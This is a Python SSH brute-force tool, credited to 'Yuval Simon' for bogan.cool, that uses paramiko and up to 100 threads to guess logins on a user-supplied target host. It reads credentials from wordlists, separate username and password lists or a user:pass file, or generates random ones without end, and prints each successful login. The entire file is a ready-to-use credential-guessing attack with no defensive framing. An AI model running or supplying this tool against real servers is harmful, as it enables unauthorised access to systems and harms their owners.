import time
import threading
import subprocess
import random
import string
import paramiko
from colorama import Fore, init

# Initialize Colorama
init(autoreset=True)

class Main:
    def __init__(self):
        subprocess.call('clear', shell=True)
        print(f"""{Fore.RED}# © SSH Bruteforcer - Made by Yuval Simon. For www.bogan.cool\n""")
        print(f"{Fore.BLUE}Choose the mode:\n"
              "1. Wordlist for both usernames and passwords\n"
              "2. Separate username and password lists\n"
              "3. User:Pass file (separated by ':')\n"
              "4. Automatic generation of usernames and passwords\n")
        self.op = input('Selection [1-4]: ').strip()
        self.verbose = input('[CONSOLE] Print fails (yes/no): ').strip().lower() in ['yes', 'y']
        self.thr = int(input('[CONSOLE] Number of threads (1-100): ').strip())
        self.timeout = float(input('[CONSOLE] Timeout between attempts (0.1-2): ').strip())
        self.target = input('[CONSOLE] Target IP or host: ').strip()
        self.found = False
        self.checked = 0
        self.fails = 0
        self.threads = []

    def connect(self, host, uname, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=uname, password=password, timeout=5)
            print(f'{Fore.GREEN}[SUCCESS] {uname}:{password}')
            self.found = True
        except paramiko.AuthenticationException:
            self.fails += 1
            if self.verbose:
                print(f'{Fore.RED}[FAIL] {uname}:{password}')
        except Exception as e:
            print(f'{Fore.RED}[ERROR] {e}')

    def extract_file(self, path):
        users, passwords = [], []
        with open(path, 'r', encoding='utf-8') as f:
            for line in f:
                if ':' in line:
                    u, p = line.split(':', 1)
                    users.append(u.strip())
                    passwords.append(p.strip())
        return users, passwords

    def auto_generate(self):
        # Ask for user input
        u_len = int(input('Length of username: ').strip())
        p_len = int(input('Length of password: ').strip())
        print('Choose character types:\n1. Numbers only\n2. Letters only\n3. Numbers + Letters')
        choice = input('Selection [1-3]: ').strip()
        charset = ''
        if choice == '1':
            charset = string.digits
        elif choice == '2':
            charset = string.ascii_letters
        else:
            charset = string.ascii_letters + string.digits

        while not self.found:
            uname = ''.join(random.choice(charset) for _ in range(u_len))
            password = ''.join(random.choice(charset) for _ in range(p_len))
            self.connect(self.target, uname, password)
            if not self.found:
                time.sleep(self.timeout)

    def start(self):
        if self.op == '1':
            path = input('Wordlist path: ').strip()
            creds = [w.strip() for w in open(path, 'r', encoding='utf-8')]
            while not self.found and self.checked < len(creds):
                if threading.active_count() < self.thr:
                    cred = creds[self.checked]
                    t = threading.Thread(target=self.connect, args=(self.target, cred, cred))
                    t.start()
                    self.threads.append(t)
                    self.checked += 1
                else:
                    time.sleep(0.01)

        elif self.op == '2':
            path1 = input('Username list path: ').strip()
            path2 = input('Password list path: ').strip()
            users = [user.strip() for user in open(path1, "r", encoding='utf-8')]
            passwords = [password.strip() for password in open(path2, "r", encoding='utf-8')]
            while not self.found and self.checked < len(users):
                if threading.active_count() < self.thr:
                    user = users[self.checked]
                    password = passwords[self.checked]
                    t = threading.Thread(target=self.connect, args=(self.target, user, password))
                    t.start()
                    self.threads.append(t)
                    self.checked += 1
                else:
                    time.sleep(0.01)

        elif self.op == '3':
            path = input('User:Pass file path: ').strip()
            users, passwords = self.extract_file(path)
            while not self.found and self.checked < len(users):
                if threading.active_count() < self.thr:
                    user = users[self.checked]
                    password = passwords[self.checked]
                    t = threading.Thread(target=self.connect, args=(self.target, user, password))
                    t.start()
                    self.threads.append(t)
                    self.checked += 1
                else:
                    time.sleep(0.01)

        elif self.op == '4':
            self.auto_generate()

        # Wait for threads to finish
        for t in self.threads:
            t.join()

